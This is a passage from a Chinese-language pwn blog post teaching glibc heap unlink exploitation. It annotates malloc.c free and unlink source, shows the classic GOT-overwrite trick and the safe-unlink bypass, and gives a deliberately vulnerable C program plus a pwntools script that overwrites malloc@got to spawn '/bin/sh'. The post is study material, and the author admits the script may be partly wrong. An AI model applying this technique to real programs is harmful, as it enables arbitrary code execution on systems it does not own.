chunk_at_offset(p, -((long)prevsize));  //p指向上一个chunk的开始处                     if (__glibc_unlikely(chunksize(p) != prevsize))   //然后这个应该是检查prev_size对不对，利用的是前后改变的chunk的size大小跟prev_size是不是相等                           malloc_printerr(&quot;corrupted size vs. prev_size while  consolidating&quot;);                    unlink(av, p, bck, fwd);   //这个就是我们要利用的地方了，下面有详解            }</code></pre></li><li>同时我截取_int_free的一段源码进行解析：<pre><code>_int_free(mstate av, mchunkptr p, int have_lock)  //这是它的参数 av是指向main_arena , p是指向要free的chunk{if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0)   //这个是检查pointer是否合法if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))  //这个检查chunk的size是否合法if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast())  //还要检查是否属于fastbin 因为fastbin free的时候有自己的方式else if (!chunk_is_mmapped(p))  //上面那个检查通过后直接跳到这里，检查是否是mmap出来的chunk}</code></pre>8.最重要的就是合并时候的操作： 看6.<br>9.然后就是unlink了：<pre><code>#!c  /*这个unlink函数实际上是很长的，我下面截取关键部分/*malloc.c  int_free函数中*//* consolidate backward */if (!prev_inuse(p)) {  prevsize = p-&gt;prev_size;size += prevsize;  p = chunk_at_offset(p, -((long) prevsize));  unlink(p, bck, fwd);}   /*这一部分前面讲过了*///相关函数说明：/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/#define unlink(P, BK, FD) {                                            \FD = P-&gt;fd;                                   //我们看这里，此时的P其实指向的当前要free的chunk的前一个chunk了，它还在bin里面，我们首先要把它从bin里面拿出来BK = P-&gt;bk;                                   \FD-&gt;bk = BK;                                  \BK-&gt;fd = FD;                                  //这几部下来就把chunk拿出来了（其实就是拿出来，然后前后连起来）...     //后面又是一顿操作，把合并的chunk给放到新的bin里面}</code></pre>10.我们说一下如何利用：</li></ol><ul><li>如果有heap overflow可以覆盖到某一个chunk q 的prev_size. 那么free q 时传入unlink（p）的 p 就可以控制</li><li>使得chunk p的内容可以被控制</li><li>FD = P -&gt; fd ; BK = P -&gt; bk ;  我们可以使得 PK = P -&gt; fd = <a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a> - 0x18 （这就是的PK的bk处被写成了<a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a>） , BK = P -&gt; bk = shellcode ,那么free @got.plt就会被写入成为shellcode</li><li>但是，BK-&gt;fd = FD 那么你之前写入的shellcode的第16个bit开始会被改成 <a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a> - 0x18  ，针对这个其实我们就可以开头插入一个jmp去跳过它</li></ul><p>一个实验用的（这里是32位的，大致跟64位利用相同）</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main( int argc, char * argv[] ){        char * first, * second;/*[1]*/ first = malloc( 666 );/*[2]*/ second = malloc( 12 );        if(argc!=1)/*[3]*/         strcpy( first, argv[1] );/*[4]*/ free( first );/*[5]*/ free( second );/*[6]*/ return( 0 );}</code></pre><p>在所有的malloc执行完之后：<br><img src="/2019/08/02/glibc-heap-unlink-lou-dong/1.png" title="This is an image"><br>unlink源码分析：</p><p>先后合并（把当前chunk的前一个chunk和当前chunk合并）</p><pre><code>#!c  /*这个unlink函数实际上是很长的，我下面截取关键部分    /*malloc.c  int_free函数中*//* consolidate backward */    if (!prev_inuse(p)) {      prevsize = p-&gt;prev_size;size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(p, bck, fwd);}   /*这一部分前面讲过了*///相关函数说明：/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/#define unlink(P, BK, FD) {                                            \    FD = P-&gt;fd;                                   //我们看这里，此时的P其实指向的当前要free的chunk的前一个chunk了，它还在bin里面，我们首先要把它从bin里面拿出来    BK = P-&gt;bk;                                       FD-&gt;bk = BK;                                      BK-&gt;fd = FD;                                  //这几部下来就把chunk拿出来了（其实就是拿出来，然后前后连起来）    ...     //后面又是一顿操作，把合并的chunk给放到新的bin里面}</code></pre><p>malloc第一个chunk的prev_inuse标志一直都是1 虽然它事实上不存在<br>向前合并（forward） ：<br>检查next chunk是否处于free状态，我们回去检查next next chunk的prev_inuse标志位是否为1，下面是源码：</p><pre><code>#!c……/*这里p指向当前chunk*/nextchunk = chunk_at_offset(p, size);……nextsize = chunksize(nextchunk);……if (nextchunk != av-&gt;top) {      /* get and clear inuse bit */      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);//判断nextchunk是否为free chunk      /* consolidate forward */      if (!nextinuse) { //next chunk为free chunk            unlink(nextchunk, bck, fwd); //将nextchunk从链表中移除          size += nextsize; // p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！      } else            clear_inuse_bit_at_offset(nextchunk, 0);          ……    }</code></pre><p>在这个例子中next next chunk 就是top chunk，那么top chunk 的prev_inuse始终为1 ，所以也不会进行向前合并，但是我们可以利用堆溢出伪造，不过，我们还要了解一下合并后或者不满足条件没合并的chunk会怎么办：glibc malloc中会把他们放到unsorted bin之中</p><pre><code>#!c/*Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.*/  bck = unsorted_chunks(av); //获取unsorted bin的第一个chunk/*  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */    #define unsorted_chunks(M)          (bin_at (M, 1))*/      fwd = bck-&gt;fd;      ……      p-&gt;fd = fwd;      p-&gt;bk = bck;      if (!in_smallbin_range(size))        {          p-&gt;fd_nextsize = NULL;          p-&gt;bk_nextsize = NULL;        }      bck-&gt;fd = p;      fwd-&gt;bk = p;        set_head(p, size | PREV_INUSE);//设置当前chunk的size,并将前一个chunk标记为已使用set_foot(p, size);//将后一个chunk的prev_size设置为当前chunk的size/*   /* Set size/use field */   #define set_head(p, s)       ((p)-&gt;size = (s))   /* Set size at footer (only when chunk is not in use) */   #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))*/</code></pre><p>上面基本就是说，free后的chunk插入到unsorted chunk的第一个chunk(这个其实是bin)与下一个chunk（这个才是真正可用的第一个chunk）的中间当做表头，然后通过设置自己的size字段来表示前一个chunk可用，然后更改next chunk的prev_size为改chunk的大小，<br>但是本例中的chunk second没被放入unsort bin，而是放入了fastbin.<br>下面我们可以精心布置chunk second来实现攻击：<br>1.我们要修改chunk second 的chunk header</p><ul><li>任意数</li><li>size = -4  -4 = 11111100  //这个主要是控制prev_inuse 位</li><li>fd = free函数的got表地址-12</li><li>bk = shellcode的地址</li></ul><p>这样程序在继续运行得话如果free(first) , 我们要考虑是否合并，首先肯定不会向后合并，那就考虑向后合并，glibc通过chunk second 的size + chunk second 的prev_size 来确定next next chunk，那么现在size是-4，那么现在next_chunk，被当做next next chunk，因为size = -4所以next_chunk被当做free的，然后出发unlink，进行合并操作，</p><pre><code>BK=second-&gt;bk（在例子中bk实际上是shellcode的地址）FD=second-&gt;fd (在例子中fd实际上是free@got的地址 - 12)FD-&gt;bk=BK/*shellcode被写进了FD+12的位置，但是FD是free@got的地址-12，所以实际上我们已经把shellcode地址写入了free@got*/BK-&gt;fd=FD</code></pre><p>可是新的glibc增加了保护机制防止unlink,但是仍然可以绕过，下面同用于64和32位,但是例子是64位的：<br>检查源码：</p><pre><code>#define unlink(P, BK, FD) {                                                FD = P-&gt;fd;                             BK = P-&gt;bk;       if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))       //具体就是说在进行unlink操作之前，会先检查当前chunk的prev_chunk的fd和next_chunk的bk是不是当前chunk。            malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);                                      FD-&gt;bk = BK;                                      BK-&gt;fd = FD;                                   ...     }</code></pre><p>overwrite Heap Pointer 利用条件:</p><ul><li>有一个指针指向heap</li><li>存放改指针的地址已知（比如改指针是全局变量）</li><li>可以对改指针多次写入 </li></ul><p>那么我们就可以构造下面来越过检查：</p><ul><li>p -&gt; fd = &amp;p - 0x18</li><li>p -&gt; bk = &amp;p - 0x10</li><li>接着源码继续进行 ， FD -&gt; bk = BK ; BK - &gt; fd = FD; </li><li>上述完成后我们得到的结果是 ： p = &amp;p - 0x18 </li></ul><p>引入一个例题（这个例题可以用来解释，但是实际操作的时候呢，程序会因为stdout,stdin，生成chunk 夹在中间，使得程序利用难以实现），不过重要的是思路：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;char *cmd;void sh(char *c){    system(c);}int main(){    char *ptr[8];    int size;    int n;    setvbuf(stdout,0,_IONBF,0);    memset(ptr,0,sizeof(ptr));    cmd = malloc(128);    //这里有一个地址已知的全局变量指针，还指向了heap , 而且下面的fgets可以实现对改指针的多次写入    while(1)    {        fgets(cmd,128,stdin);        if(!strncmp(cmd,&quot;add&quot;,3))        {            printf(&quot;Index: &quot;);            scanf(&quot;%d&quot;,&amp;n);            if(n&gt;=0 &amp;&amp; n&lt;8)            {                printf(&quot;Size: &quot;);                scanf(&quot;%d%*c&quot;,&amp;size);                ptr[n] = malloc(size);                printf(&quot;Data: &quot;);                gets(ptr[n]);            }            else            {                puts(&quot;out of bound&quot;);            }        }        else if(!strncmp(cmd,&quot;renove&quot;,6))        {            printf(&quot;Index: &quot;);            scanf(&quot;%d%*c&quot;,&amp;n);            if(n&gt;=0 &amp;&amp; n&lt;8 &amp;&amp; ptr[n])            {                puts(ptr[n]);                free(ptr[n]);                ptr[n] = 0;            }            else            {                puts(&quot;nothing here&quot;);            }        }        else        {            puts(&quot;unkonw command&quot;);        }    }    return 0;}</code></pre><p>下面我们先给出脚本来方便分析</p><pre><code>#coding:utf-8from pwn import *context.log_level = &quot;debug&quot;r = remote(&#39;0.0.0.0&#39;,4000)#r = process(&#39;./unlink2&#39;)elf = ELF(&#39;unlink3&#39;)malloc_got = elf.got[&#39;malloc&#39;]sh_addr = 0x0000000004008A9def malloc(idx,size,data):    r.sendline(&#39;add&#39; + &#39;0&#39;*5 + p64(0x100) + p64(0x0000000006010B0-0x18)+p64(0x0000000006010B0-0x10))    3这里就在于构造FD的fd 和 bk 用于躲过检查    r.sendline(str(idx))    r.sendline(str(size))    r.sendline(str(data))def free(idx):    r.sendline(&#39;renove&#39;)    r.sendline(str(idx))malloc(0,130,&#39;aaaaaaaa&#39;)malloc(1,130,&#39;bbbbbbbb&#39;)free(0)malloc(2,130, 0x80 * &#39;a&#39; + p64(0x1120) + p64(0x90))  #利用heap overflow 改变下一个chunk的prev_size 和 sizefree(1)   #之后&amp;cmd = 0x0000000006010B0 - 0x18 ,这里要注意的是不是free(2),因为上一步改了size位，所以2相当于还是free着呢，所以free(2),会触碰double free检查payload1 = &#39;a&#39; * 0x18 + p64(malloc_got)  //这是的cmd指针 已经被修改了 ， 我们通过fget 可以使得cmd 再次被改为 malloc@got.pltr.sendline(payload1)payload2 = p64(sh_addr) + &#39;;/bin/sh\x00&#39;   //这里就是构造sh函数  ， 可能参数写错了  r.sendline(payload2)r.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
